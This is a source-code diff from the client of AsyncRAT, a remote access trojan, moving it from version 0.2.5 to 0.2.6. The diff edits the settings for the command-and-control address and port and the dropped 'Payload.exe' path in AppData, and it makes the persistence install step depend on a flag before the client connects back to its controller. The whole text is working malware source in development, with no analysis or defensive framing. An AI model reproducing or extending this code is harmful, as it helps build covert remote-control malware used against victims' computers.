@@ -14,23 +14,22 @@ using Client.Install;
 
 namespace Client
 {
-    /// The Main Settings
     class Settings
     {
         public static readonly string IP = "127.0.0.1";
-        public static readonly int Port = 6606;
-        public static readonly string Version = "AsyncRAT 0.2.5";
-        public static readonly string ClientFullPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Payload.exe");
+        public static readonly string Port = "6606";
+        public static readonly string Version = "AsyncRAT 0.2.6";
+        public static readonly string Install = "false";
+        public static readonly string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
     }
 
-    /// The Main Class
-    /// Contains all methods for socket and reading the packets
     class Program
     {
 
 
         static void Main()
         {
+            if (Settings.Install == "true")
             NormalStartup.Install();
 
             ClientSocket.InitializeClient();
